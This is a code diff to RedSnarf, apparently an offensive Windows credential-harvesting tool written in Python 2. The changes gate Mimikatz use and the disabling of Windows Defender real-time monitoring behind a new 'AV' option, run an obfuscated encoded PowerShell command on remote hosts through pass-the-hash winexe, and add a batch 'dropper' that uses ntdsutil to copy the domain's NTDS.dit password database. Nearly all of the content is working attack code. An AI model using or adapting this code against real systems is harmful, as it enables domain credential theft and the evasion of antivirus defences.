@@ -815,7 +815,7 @@ def datadump(user, passw, host, path, os_version):
 				except OSError:
 					print colored("[-]Something went wrong here...",'red')
 
-			if multi_rdp in yesanswers:
+			if multi_rdp in yesanswers or multi_rdp=="AV":
 				try:
 					print colored("[+]Checking for Invoke-Mimikatz.ps1",'green')
 					if not os.path.isfile('./a'):
@@ -842,7 +842,7 @@ def datadump(user, passw, host, path, os_version):
 					
 					x=' '
 					
-					if "Windows 10.0" in os_version:
+					if multi_rdp=="AV":
 						#Get Windows Defender status and store status
 						print colored("[+]Getting Windows Defender Status",'yellow')
 						line="Get-MpPreference | fl DisableRealtimeMonitoring"
@@ -857,7 +857,7 @@ def datadump(user, passw, host, path, os_version):
 							print colored("[+]Windows Defender RealTimeMonitoring Turned Off",'yellow')
 							AVstatus='Off'
 
-					if "Windows 10.0" in os_version:
+					if multi_rdp=="AV":
 						#If Windows Defender is turned on turn off 
 						if AVstatus=='On':
 							response = raw_input("Would you like to temporarily disable Windows Defender Realtime Monitoring: Y/(N) ")
@@ -878,7 +878,7 @@ def datadump(user, passw, host, path, os_version):
 					
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
 										
-					if "Windows 10.0" in os_version:
+					if multi_rdp=="AV":
 						#If Windows Defender AV status was on, turn it back on
 						if AVstatus=='On':
 							if response in yesanswers:	
@@ -1561,7 +1561,7 @@ def main():
 					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')
 
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.3e", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.3f", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
 p.add_argument("-u", "--username", dest="username", default="Administrator",help="Enter a username")
@@ -2548,7 +2548,20 @@ if drsuapi in yesanswers:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
-if ntds_util in yesanswers:
+if ntds_util in yesanswers or ntds_util=="d":
+	#Currently undocumented function - creates a bat file which can be copied and pasted to the remote machine if the process can't be fully automated
+	if ntds_util=='d':
+		print colored("[+]Writing NTDS.dit dropper to /tmp/ntds.bat",'green')
+		print colored("[+]Copy this file via RDP to the remote machine then run it, then copy the c:\\redsnarf folder back to this machine",'yellow')
+		pscommand="ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\redsnarf\" q q"
+		fout=open('/tmp/ntds.bat','w')
+		fout.write('@echo off\n')
+		fout.write(pscommand)
+		fout.close() 
+
+		sys.exit()
+
+	#Normal fully automated functionality starts here
 	if len(targets)==1:
 		try:
 			checkport()
